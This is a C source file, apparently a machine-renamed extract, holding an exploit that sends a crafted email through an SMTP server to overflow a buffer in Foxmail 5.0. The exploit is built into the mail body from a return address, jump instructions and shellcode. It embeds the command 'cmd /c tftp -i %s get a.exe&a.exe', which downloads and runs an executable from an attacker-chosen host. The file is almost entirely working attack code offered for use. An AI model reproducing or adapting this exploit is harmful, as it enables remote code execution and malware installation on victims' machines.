#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  tmp ;
typedef  int /*<<< orphan*/  sbuf ;
typedef  int /*<<< orphan*/  buf ;
typedef  scalar_t__ SOCKET ;

/* Variables and functions */
 scalar_t__ FUNC0 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  SMTPPORT ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 scalar_t__ packet ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int FUNC7 (scalar_t__,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC8 (scalar_t__,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*) ; 
 int FUNC12 (char*) ; 

int  FUNC13(    char *mailaddr, char *tftp, char *smtpserver, char *shellcode)
{
    SOCKET  csock;
    int     ret,i=0;
    char buf[510], sbuf[0x10000], tmp[500], tmp1[500];
    csock = FUNC0(smtpserver, SMTPPORT, 10);
    if(csock<0)
    {
        FUNC6("connect err.\n");
        FUNC3(1);
    }

    FUNC5(buf, 0, sizeof(buf));
    ret=FUNC7(csock, buf, 4096, 0);
    if(ret<=0)
    {
        FUNC6("recv err.\n");
        FUNC3(1);
    }
    FUNC6(buf);

    ret=FUNC8(csock, "HELO server\r\n",FUNC12("HELO server\r\n"), 0);
    if(ret<=0)
    {
        FUNC6("send err.\n");
        FUNC3(1);
    }
    FUNC5(buf, 0, sizeof(buf));
    ret=FUNC7(csock, buf, 4096, 0);
    if(ret<=0)
    {
        FUNC6("recv err.\n");
        FUNC3(1);
    }
    FUNC6(buf);

    ret=FUNC8(csock, "MAIL FROM: info@sina.com\r\n",FUNC12("MAIL FROM: info@sina.com\r\n"), 0);
    if(ret<=0)
    {
        FUNC6("send err.\n");
        FUNC3(1);
    }
    FUNC5(buf, 0, sizeof(buf));
    ret=FUNC7(csock, buf, 4096, 0);
    if(ret<=0)
    {
        FUNC6("recv err.\n");
        FUNC3(1);
    }
    FUNC6(buf);
    
    FUNC9(tmp, "RCPT TO: %s\r\n", mailaddr);
    ret=FUNC8(csock, tmp,FUNC12(tmp), 0);
    if(ret<=0)
    {
        FUNC6("send err.\n");
        FUNC3(1);
    }
    FUNC5(buf, 0, sizeof(buf));
    ret=FUNC7(csock, buf, 4096, 0);
    if(ret<=0)
    {
        FUNC6("recv err.\n");
        FUNC3(1);
    }
    FUNC6(buf);
    FUNC1(1000);
    
    ret=FUNC8(csock, "DATA\r\n",FUNC12("DATA\r\n"), 0);
    if(ret<=0)
    {
        FUNC6("send err.\n");
        FUNC3(1);
    }
    FUNC5(buf, 0, sizeof(buf));
    ret=FUNC7(csock, buf, 4096, 0);
    if(ret<=0)
    {
        FUNC6("recv err.\n");
        FUNC3(1);
    }
    FUNC6(buf);

    FUNC6("send exploit mail...\n");
    FUNC5(sbuf, 0, sizeof(sbuf));
    FUNC5(buf, 0, sizeof(buf));
    FUNC5(buf, 0x41, sizeof(buf)-1);
    FUNC5(tmp, 0, sizeof(tmp));
    //strcpy(tmp, winexec);//WinExec() address in Foxmail.exe module(foxmail 5.0.300)
    FUNC11(tmp, shellcode);//WinExec() address in Foxmail.exe module
    FUNC10(tmp, "cmd /c tftp -i %s get a.exe&a.exe:");
    FUNC9(tmp1, tmp, tftp);
    FUNC4(buf+0x100-FUNC12(tmp1), tmp1, FUNC12(tmp1));
    *(int *)(buf+0x100)=0x7ffa54cd;  //ret addr jmp esp
    *(int *)(buf+0x104)=0x80eb80eb;  //jmp back
    *(int *)(buf+0x108)=0x7ffdf220;  //writeable addr
    *(int *)(buf+0x110)=0x7ffdf220;  //writeable addr
    FUNC4(buf, "girl\x0d", 5);
    FUNC9(sbuf, (char *)packet, buf);

    ret=FUNC8(csock, sbuf,FUNC12(sbuf), 0);
    if(ret<=0)
    {
        FUNC6("send err.\n");
        FUNC3(1);
    }
    FUNC5(buf, 0, sizeof(buf));
    ret=FUNC7(csock, buf, 4096, 0);
    if(ret<=0)
    {
        FUNC6("recv err.\n");
        FUNC3(1);
    }
    FUNC6(buf);
    FUNC6("exploit mail sent.\n");
    FUNC2(csock);
    return 0;
}